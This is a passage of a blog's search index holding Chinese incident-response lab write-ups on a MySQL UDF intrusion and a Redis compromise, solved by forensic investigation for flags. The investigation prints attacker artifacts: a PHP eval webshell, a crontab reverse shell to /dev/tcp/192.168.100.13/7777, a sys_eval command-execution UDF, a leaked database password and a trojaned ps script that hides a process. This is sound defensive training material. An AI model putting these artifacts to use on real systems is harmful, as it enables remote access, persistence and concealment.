+-rw-r--r--. <span class="token number">1</span> mysql mysql    <span class="token number">6104</span> May <span class="token number">16</span>  <span class="token number">2019</span> mysql_clear_password.so
+-rw-rw-rw-. <span class="token number">1</span> mysql mysql   <span class="token number">10754</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> mysqludf.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">39944</span> May <span class="token number">16</span>  <span class="token number">2019</span> semisync_master.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">14736</span> May <span class="token number">16</span>  <span class="token number">2019</span> semisync_slave.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">55696</span> May <span class="token number">16</span>  <span class="token number">2019</span> server_audit.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql <span class="token number">2918008</span> May <span class="token number">16</span>  <span class="token number">2019</span> sphinx.so
+-rw-r--r--. <span class="token number">1</span> mysql mysql   <span class="token number">11008</span> May <span class="token number">16</span>  <span class="token number">2019</span> sql_errlog.so
+-rw-rw-rw-. <span class="token number">1</span> mysql mysql      <span class="token number">34</span> Aug  <span class="token number">1</span>  <span class="token number">2023</span> udf.so</code></pre>
+<p>果然有udf</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/usr/lib/mysql/plugin<span class="token comment"># cat udf.so</span>
+<span class="token number">1</span>       <span class="token number">2</span>       <span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>     <span class="token number">4</span></code></pre>
+
+<p><strong>flag{b1818bde4e310f3d23f1005185b973e7}</strong></p>
+<h2 id="黑客获取的权限"><a href="#黑客获取的权限" class="headerlink" title="黑客获取的权限"></a>黑客获取的权限</h2><p>直接拿黑客自定义的udf执行一下whoami看看权限<br>首先得知道mysql密码进入mysql<br>我一顿苦苦看文件在web目录找到了泄露了mysql密码<code>334cc35b3c704593</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/www/html<span class="token comment"># cat common.php</span>
+<span class="token operator">&lt;</span>?php
+<span class="token variable">$conn</span><span class="token operator">=</span>mysqli_connect<span class="token punctuation">(</span><span class="token string">"localhost"</span>,<span class="token string">"root"</span>,<span class="token string">"334cc35b3c704593"</span>,<span class="token string">"cms"</span>,<span class="token string">"3306"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"数据库连接失败"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@xuanji:/var/www/html<span class="token comment"># mysql -u root -p</span>
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
+Your MariaDB connection <span class="token function">id</span> is <span class="token number">6</span>
+Server version: <span class="token number">5.5</span>.64-MariaDB-1ubuntu0.14.04.1 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+
+Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>, <span class="token number">2018</span>, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.
+
+MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> * from mysql.func<span class="token punctuation">;</span>
++----------+-----+-------------+----------+
+<span class="token operator">|</span> name     <span class="token operator">|</span> ret <span class="token operator">|</span> dl          <span class="token operator">|</span> <span class="token builtin class-name">type</span>     <span class="token operator">|</span>
++----------+-----+-------------+----------+
+<span class="token operator">|</span> sys_eval <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span> mysqludf.so <span class="token operator">|</span> <span class="token keyword">function</span> <span class="token operator">|</span>
++----------+-----+-------------+----------+
+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
+
+MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
++--------------------+
+<span class="token operator">|</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span> <span class="token operator">|</span>
++--------------------+
+<span class="token operator">|</span> mysql
+             <span class="token operator">|</span>
++--------------------+
+<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span></code></pre>
+<p>权限是mysql<br><strong>flag{mysql}</strong></p>
+]]></content>
+      <categories>
+        <category>玄机应急靶场</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急靶场-redis应急</title>
+    <url>/posts/4844d267/</url>
+    <content><![CDATA[<pre class="language-bash" data-language="bash"><code class="language-bash">服务器账号密码 root xjredis
+<span class="token number">1</span>.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交<span class="token punctuation">;</span>
+<span class="token number">2</span>.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交<span class="token punctuation">;</span>
+<span class="token number">3</span>.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交<span class="token punctuation">;</span>
+<span class="token number">4</span>.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串<span class="token punctuation">(</span>flag<span class="token punctuation">&#123;</span>黑客的用户-关键字符串<span class="token punctuation">&#125;</span> 注关键字符串 xxx-xxx-xxx<span class="token punctuation">)</span>。将用户名和关键字符串作为 FLAG提交
+<span class="token number">5</span>.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交<span class="token punctuation">;</span></code></pre>
+<h2 id="通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交</h2><p>就是看redis的日志</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">
+root@ip-10-0-10-5:/var/log<span class="token comment"># cat /var/log/redis.log</span>
+<span class="token punctuation">..</span>.
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.173 * REPLICAOF <span class="token number">192.168</span>.100.20:8888 enabled <span class="token punctuation">(</span>user request from <span class="token string">'id=6 addr=192.168.200.2:64339 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span><span class="token punctuation">)</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.786 * Connecting to MASTER <span class="token number">192.168</span>.100.20:8888
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.786 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.788 * Non blocking connect <span class="token keyword">for</span> SYNC fired the event.
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.192 * Master replied to PING, replication can continue<span class="token punctuation">..</span>.
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.194 * Trying a partial resynchronization <span class="token punctuation">(</span>request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1<span class="token punctuation">)</span>.
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.195 * Discarding previously cached master state.
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.195 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA sync: receiving <span class="token number">48040</span> bytes from master
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA sync: Flushing old data
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA sync: Loading DB <span class="token keyword">in</span> memory
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 <span class="token comment"># Wrong signature trying to load DB from file</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 <span class="token comment"># Failed trying to load the MASTER synchronization DB from disk</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.791 * Connecting to MASTER <span class="token number">192.168</span>.100.20:8888
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.791 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.792 * Non blocking connect <span class="token keyword">for</span> SYNC fired the event.
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.205 * Module <span class="token string">'system'</span> loaded from ./exp.so
+<span class="token number">419</span>:M <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.210 <span class="token comment"># Setting secondary replication ID to 7a73a1a4297a16c50d8465b0cc432444f0e5df71, valid up to offset: 1. New replication ID is 46e68f9593cd148bffe464f0b04bee19ac447c39</span>
+<span class="token number">419</span>:M <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.210 * MASTER MODE enabled <span class="token punctuation">(</span>user request from <span class="token string">'id=6 addr=192.168.200.2:64339 fd=7 name= age=4 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=34 qbuf-free=32734 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span><span class="token punctuation">)</span>
+<span class="token punctuation">..</span>.</code></pre>
+<p>发现了redis主从复制连接到主服务器的ip 192.168.100.20,所以黑客ip是192.168.100.20<br><strong>flag{192.168.100.20}</strong></p>
+<h2 id="通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件-将黑客上传的恶意文件里面的-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件-将黑客上传的恶意文件里面的-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.205 * Module <span class="token string">'system'</span> loaded from ./exp.so</code></pre>
+<p>可以看到从<code>exp.so</code>引入system模块，找一下这个文件,往左边一瞅看到了<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuJpP.png" alt="OJuJpP.png" loading="lazy"><br>反编译看看<br>找到flag<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuPfb.png" alt="OJuPfb.png" loading="lazy"><br><strong>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</strong></p>
+<h2 id="通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少-将反弹-shell-的IP-作为-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少-将反弹-shell-的IP-作为-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ys/kernel/mm/transparent_hugepage/enabled<span class="token string">' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.
+419:M 31 Jul 2023 05:25:31.525 * Ready to accept connections
+419:S 31 Jul 2023 05:33:15.065 * Before turning into a replica, using my master parameters to synthesize a cached master: I may be able to synchronize with the new master with just a partial transfer.
+419:S 31 Jul 2023 05:33:15.065 * REPLICAOF 192.168.100.13:8888 enabled (user request from '</span>id<span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">addr</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2:64289 <span class="token assign-left variable">fd</span><span class="token operator">=</span><span class="token number">7</span> <span class="token assign-left variable">name</span><span class="token operator">=</span> <span class="token assign-left variable">age</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">idle</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">flags</span><span class="token operator">=</span>N <span class="token assign-left variable">db</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">sub</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">psub</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">multi</span><span class="token operator">=</span>-1 <span class="token assign-left variable">qbuf</span><span class="token operator">=</span><span class="token number">48</span> qbuf-free<span class="token operator">=</span><span class="token number">32720</span> <span class="token assign-left variable">obl</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">oll</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">omem</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">events</span><span class="token operator">=</span>r <span class="token assign-left variable">cmd</span><span class="token operator">=</span>slaveof'<span class="token punctuation">)</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:15.610 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:15.610 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:15.611 <span class="token comment"># Error condition on socket for SYNC: Connection refused</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:16.612 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:16.612 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:16.613 <span class="token comment"># Error condition on socket for SYNC: Connection refused</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:17.614 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:17.614 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:17.615 <span class="token comment"># Error condition on socket for SYNC: Connection refused</span>
+<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:18.616 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888</code></pre>
+<p>日志里面这个ip<code> 192.168.100.13</code>好多<br>看一眼定时任务</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-5:/var/log<span class="token comment"># crontab -l</span>
+<span class="token comment"># Edit this file to introduce tasks to be run by cron.</span>
+<span class="token comment">#</span>
+<span class="token comment"># Each task to run has to be defined through a single line</span>
+<span class="token comment"># indicating with different fields when the task will be run</span>
+<span class="token comment"># and what command to run for the task</span>
+<span class="token comment">#</span>
+<span class="token comment"># To define the time you can provide concrete values for</span>
+<span class="token comment"># minute (m), hour (h), day of month (dom), month (mon),</span>
+<span class="token comment"># and day of week (dow) or use '*' in these fields (for 'any').</span>
+<span class="token comment">#</span>
+<span class="token comment"># Notice that tasks will be started based on the cron's system</span>
+<span class="token comment"># daemon's notion of time and timezones.</span>
+<span class="token comment">#</span>
+<span class="token comment"># Output of the crontab jobs (including errors) is sent through</span>
+<span class="token comment"># email to the user the crontab file belongs to (unless redirected).</span>
+<span class="token comment">#</span>
+<span class="token comment"># For example, you can run a backup of all your user accounts</span>
+<span class="token comment"># at 5 a.m every week with:</span>
+<span class="token comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+<span class="token comment">#</span>
+<span class="token comment"># For more information see the manual pages of crontab(5) and cron(8)</span>
+<span class="token comment">#</span>
+*/1 * * * *  /bin/sh <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.100.13/7777 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
+<span class="token comment"># m h  dom mon dow   command</span></code></pre>
+<p>发现就是这个ip反弹shell<br><strong>flag{192.168.100.13}</strong></p>
+<h2 id="通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串-flag-黑客的用户-关键字符串-注关键字符串-xxx-xxx-xxx-。将用户名和关键字符串作为-FLAG提交"><a href="#通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串-flag-黑客的用户-关键字符串-注关键字符串-xxx-xxx-xxx-。将用户名和关键字符串作为-FLAG提交" class="headerlink" title="通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交"></a>通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</h2><p>看一下黑客写入的公钥</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">
+root@ip-10-0-10-5:~/.ssh<span class="token comment"># cat authorized_keys</span>
+REDIS0009▒      redis-ver5.0.1▒
+▒edis-bits▒@▒ctime▒tO▒dused-mem▒XU
+aof-preamble▒▒▒xxsshB9
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8<span class="token operator">=</span> xj-test-user</code></pre>
+<p>黑客用户<code>xj-test-user</code><br>在git上搜到该用户下的redis工具<br><img src="https://ooo.0x0.ooo/2024/06/13/OJu4Kg.png" alt="OJu4Kg.png" loading="lazy"><br><strong>flag{xj-test-user-wow-you-find-flag}</strong></p>
+<h2 id="通过本地-PC-SSH到服务器并且分析黑客篡改的命令-将黑客篡改的命令里面的关键字符串作为-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客篡改的命令-将黑客篡改的命令里面的关键字符串作为-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交</h2><p>去&#x2F;usr&#x2F;bin目录下看</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-5:/usr/bin<span class="token comment">#ls -ltr</span>
+<span class="token punctuation">..</span>
+-rwxr-xr-x <span class="token number">1</span> root root    <span class="token number">14663096</span> Jun <span class="token number">29</span>  <span class="token number">2023</span>  amazon-ssm-agent
+lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">20</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  cc -<span class="token operator">></span> /etc/alternatives/cc
+lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">21</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  c89 -<span class="token operator">></span> /etc/alternatives/c89
+lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">21</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  c99 -<span class="token operator">></span> /etc/alternatives/c99
+lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">26</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  automake -<span class="token operator">></span> /etc/alternatives/automake
+lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">25</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  aclocal -<span class="token operator">></span> /etc/alternatives/aclocal
+-rwxr-xr-x <span class="token number">1</span> root root      <span class="token number">133432</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  ps_
+<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> root root         <span class="token number">178</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  <span class="token function">ps</span></code></pre>
+<p>可以看到一个叫<code>ps_</code>的很奇怪，不过从ps下拿到了flag</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-5:/usr/bin<span class="token comment"># cat ps</span>
+<span class="token comment">#/bin/bash</span>
+<span class="token assign-left variable">oldifs</span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$IFS</span>"</span>
+<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token string">'\$n'</span>
+<span class="token assign-left variable">result</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>ps_ $1 $2 $3<span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'threadd'</span> <span class="token variable">)</span></span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">v</span> <span class="token keyword">in</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token keyword">do</span>
+        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$v</span><span class="token entity" title="\t">\t</span>"</span><span class="token punctuation">;</span>
+<span class="token keyword">done</span>
+<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token string">"<span class="token variable">$oldifs</span>"</span>
+<span class="token comment">#//c195i2923381905517d818e313792d196</span></code></pre>
+<p><strong>flag{c195i2923381905517d818e313792d196}</strong></p>
+]]></content>
+      <categories>
+        <category>玄机应急靶场</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
       </tags>
   </entry>
 </search>
